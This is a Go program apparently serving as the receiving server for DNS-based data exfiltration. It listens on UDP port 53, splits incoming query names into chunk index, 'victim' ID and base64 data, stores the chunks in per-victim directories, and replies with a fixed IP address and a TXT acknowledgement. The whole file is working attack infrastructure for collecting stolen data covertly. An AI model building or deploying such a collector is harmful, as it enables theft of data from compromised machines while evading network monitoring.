package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/miekg/dns"
	log "github.com/sirupsen/logrus"
)

// Parse and handle DNS query
func parseQuery(m *dns.Msg, w dns.ResponseWriter) {
	for _, q := range m.Question {
		switch q.Qtype {
		case dns.TypeA:
			log.Printf("Query received: %s (from: %s)\n", q.Name, w.RemoteAddr().String())
			parts := strings.Split(q.Name, ".")
			if len(parts) < 4 {
				log.Warnf("Invalid query format: %s", q.Name)
				continue
			}

			chunkIndex := parts[0]
			victimID := parts[1]
			chunkData := parts[2]
			domain := strings.Join(parts[3:], ".")

			// Create victim directory
			victimDir := filepath.Join("logs", "results", victimID)
			if err := os.MkdirAll(victimDir, 0755); err != nil {
				log.Errorf("Failed to create directory %s: %v", victimDir, err)
				continue
			}

			// Check for duplicate chunk
			chunkFile := filepath.Join(victimDir, fmt.Sprintf("chunk%s.b64", chunkIndex))
			if _, err := os.Stat(chunkFile); !os.IsNotExist(err) {
				log.Infof("Duplicate chunk %s for victim %s, skipping", chunkIndex, victimID)
				continue
			}

			// Store chunk
			if err := os.WriteFile(chunkFile, []byte(chunkData), 0644); err != nil {
				log.Errorf("Failed to store chunk %s: %v", chunkFile, err)
			} else {
				log.Infof("Stored chunk %s for victim %s", chunkIndex, victimID)
			}

			// Log DNS query
			logEntry := fmt.Sprintf("%s %s %s %s\n", time.Now().Format(time.RFC3339), w.RemoteAddr().String(), q.Name, "A")
			if err := os.WriteFile("logs/raw/dns_query.log", []byte(logEntry), 0644); err != nil {
				log.Errorf("Failed to log DNS query: %v", err)
			}

			// A record response
			rr, err := dns.NewRR(fmt.Sprintf("%s A 178.128.53.254", q.Name))
			if err != nil {
				log.Errorf("Failed to create A record: %v", err)
				continue
			}
			m.Answer = append(m.Answer, rr)

			// TXT record response (ACK)
			txtRR, err := dns.NewRR(fmt.Sprintf("%s TXT \"ACK:%s\"", q.Name, chunkIndex))
			if err != nil {
				log.Errorf("Failed to create TXT record: %v", err)
				continue
			}
			m.Answer = append(m.Answer, txtRR)

		default:
			log.Printf("Unsupported query type %v: %s\n", q.Qtype, q.Name)
		}
	}
}

// DNS request handler
func handleDNSRequest(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Compress = false

	switch r.Opcode {
	case dns.OpcodeQuery:
		parseQuery(m, w)
	}

	if err := w.WriteMsg(m); err != nil {
		log.Errorf("Failed to send response: %v", err)
	}
}

func main() {
	// Logging setup
	log.SetFormatter(&log.TextFormatter{
		FullTimestamp: true,
	})

	// Create directories
	if err := os.MkdirAll("logs/raw", 0755); err != nil {
		log.Fatalf("Failed to create logs/raw directory: %v", err)
	}
	if err := os.MkdirAll("logs/results", 0755); err != nil {
		log.Fatalf("Failed to create logs/results directory: %v", err)
	}

	// Start DNS server
	server := &dns.Server{Addr: ":53", Net: "udp"}
	dns.HandleFunc(".", handleDNSRequest)

	log.Info("Starting DNS server on :53")
	if err := server.ListenAndServe(); err != nil {
		log.Fatalf("Failed to start server: %v", err)
	}
}
